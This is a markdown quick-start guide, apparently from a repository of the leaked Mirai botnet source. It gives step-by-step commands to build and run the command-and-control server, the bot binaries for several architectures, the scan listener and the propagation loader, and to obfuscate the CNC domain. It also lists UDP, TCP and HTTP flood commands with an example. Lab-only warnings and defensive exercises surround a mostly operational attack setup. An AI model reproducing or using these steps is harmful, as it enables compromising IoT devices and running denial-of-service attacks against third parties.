# Mirai - Quick Start Guide for Home Lab Testing

## ⚠️ LEGAL WARNING
**USE ONLY IN ISOLATED LAB ENVIRONMENTS WITH DEVICES YOU OWN**
- Running this on public networks is ILLEGAL
- Only test against systems you have explicit permission to test
- Ensure complete isolation from production networks

## 🎯 What You'll Build

A complete botnet testing environment with:
1. Command & Control (CNC) server
2. MySQL database for bot tracking
3. Bot malware (compiled for testing)
4. Loader for propagation testing
5. Scan listener for reconnaissance results

## 🔧 Prerequisites

### Required Software
```bash
# Update system
sudo apt-get update

# Install core dependencies
sudo apt-get install -y \
    gcc \
    golang-go \
    electric-fence \
    mysql-server \
    mysql-client \
    git \
    build-essential
```

### Verify Installation
```bash
gcc --version      # Should be 7.x or higher
go version         # Should be 1.11 or higher
mysql --version    # Should be 5.7 or higher
```

## 🚀 Quick Setup (30 Minutes)

### Step 1: Clone Repository (Already Done)
```bash
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code
```

### Step 2: Setup MySQL Database
```bash
# Start MySQL service
sudo service mysql start

# Create database and tables
sudo mysql < scripts/db.sql

# Create admin user
sudo mysql mirai -e "INSERT INTO users VALUES (NULL, 'admin', 'password123', 0, 0, 0, 0, -1, 1, 30, '');"

# Verify
sudo mysql mirai -e "SELECT * FROM users;"
```

### Step 3: Configure CNC Server
```bash
# Edit CNC configuration
nano mirai/cnc/main.go
```

Update these lines:
```go
const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "root"
const DatabasePass string   = ""  // Your MySQL root password
const DatabaseTable string  = "mirai"
```

### Step 4: Build Everything (Debug Mode)
```bash
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code/mirai

# Build in debug mode (recommended for testing)
./build.sh debug telnet
```

This will create in `debug/` folder:
- `cnc` - Command & Control server
- `mirai.dbg` - Bot for x86 (with debug output)
- `mirai.arm` - Bot for ARM devices
- `enc` - Configuration encoder tool
- `scanListen` - Scan result listener

### Step 5: Configure Bot Domain (Optional)
By default, bot tries to connect to `cnc.changeme.com`. To change:

```bash
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code/mirai

# Generate obfuscated string for your domain
./debug/enc string localhost

# Output will show something like:
# XOR'ing 9 bytes of data...
# \x1e\x43\x41\x47\x4e\x4a\x43\x41\x56\x22

# Edit bot/table.c and update TABLE_CNC_DOMAIN:
nano bot/table.c
```

Find this line:
```c
add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30);
```

Replace with your encoded string and update the byte count.

### Step 6: Run CNC Server
```bash
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code/mirai/debug

# Start CNC server
./cnc
```

You should see:
```
Mysql DB opened
Listening on port :23 (CNC)
Listening on port :101 (API)
```

### Step 7: Connect to CNC
Open a new terminal:
```bash
telnet localhost 23
```

Login with:
- Username: `admin`
- Password: `password123`

You should see the Mirai prompt!

## 🧪 Testing the Bot (Safely)

### Run Bot in Test Mode
```bash
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code/mirai/debug

# Run bot (it will try to connect to CNC)
./mirai.dbg
```

The bot will:
1. Try to resolve CNC domain
2. Connect to CNC server
3. Register itself
4. Wait for commands

### Check Bot Connection in CNC
In your telnet session to CNC, type:
```
bots
```

You should see your bot listed!

## 📊 Understanding the Output

### CNC Commands
Once logged into CNC:
- `?` - Show help
- `bots` - List connected bots
- `botcount` - Show number of bots
- Attack commands (see below)

### DDoS Attack Commands (Testing Only)
**⚠️ Only use against systems you own!**

```
# UDP flood
udp [target_ip] [duration] [packet_size] [target_port]

# TCP flood  
tcp [target_ip] [duration] [packet_size] [target_port] [flags]

# HTTP flood
http [target_url] [duration]
```

Example (against your own test server):
```
udp 192.168.1.100 60 512 80
```

## 🔍 Advanced Features

### Scan Listener
Receive brute-force results from bots:
```bash
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code/mirai/debug
./scanListen 48101
```

### Build Loader
```bash
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code/loader
./build.sh

# Run loader (needs scan results on stdin)
./loader
```

### Production Builds
For stripped, optimized binaries:
```bash
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code/mirai
./build.sh release telnet
```

Binaries will be in `release/` folder:
- `cnc` - Production CNC
- `mirai.x86` - x86 bot
- `mirai.arm` - ARM bot
- `mirai.mips` - MIPS bot
- etc.

## 🐛 Troubleshooting

### Bot Can't Connect to CNC
1. Check CNC is running: `netstat -tulpn | grep :23`
2. Check firewall: `sudo ufw status`
3. Verify domain resolution or use IP in table.c
4. Check MySQL is running: `sudo service mysql status`

### Build Fails
1. Install dependencies: `sudo apt-get install gcc golang electric-fence`
2. Check Go is in PATH: `which go`
3. For cross-compilation errors, ignore them (need cross-compilers)

### MySQL Connection Failed
1. Check MySQL is running: `sudo service mysql status`
2. Verify credentials in `cnc/main.go`
3. Check database exists: `sudo mysql -e "SHOW DATABASES;"`
4. Verify user table: `sudo mysql mirai -e "SELECT * FROM users;"`

### Permission Denied
Run CNC as root or adjust capabilities:
```bash
sudo ./cnc
```

## 🔐 Security Reminders

### Network Isolation
```bash
# Ensure your lab is isolated
# Use VMs with host-only networking
# Or dedicated VLAN with no internet access
```

### After Testing
```bash
# Stop all processes
pkill -f cnc
pkill -f mirai
pkill -f loader

# Clean up test bots
ps aux | grep mirai
kill [PID]
```

## 📚 Next Steps

1. **Read ANALYSIS.md** - Detailed architecture overview
2. **Study the code** - Start with `mirai/bot/main.c`
3. **Analyze attacks** - Look at `mirai/bot/attack*.c`
4. **Understand obfuscation** - Check `mirai/bot/table.c`
5. **Explore CNC** - Read `mirai/cnc/*.go`

## 🎓 Learning Exercises

1. **Trace a bot connection** - Use Wireshark to capture CNC protocol
2. **Decode obfuscated strings** - Use the enc tool
3. **Analyze an attack** - Read attack_udp.c and implement defense
4. **Create signatures** - Write IDS rules to detect Mirai
5. **Implement patches** - Fix security issues in the code

## 🆘 Getting Help

Common issues:
- Cross-compiler errors: Ignore unless building release for specific architecture
- MySQL connection: Check credentials match between config and database
- Bot not connecting: Verify domain/IP in table.c
- CNC port conflict: Check nothing else uses port 23

## 📖 Additional Resources

- `README.md` - Original setup instructions
- `ForumPost.md` - Original leak post with technical details
- `ANALYSIS.md` - Deep dive into architecture
- `mirai/bot/table.h` - Configuration options explained

---

**Happy (ethical) hacking! 🔒**

Remember: This is for learning defensive security, not for attacking systems.
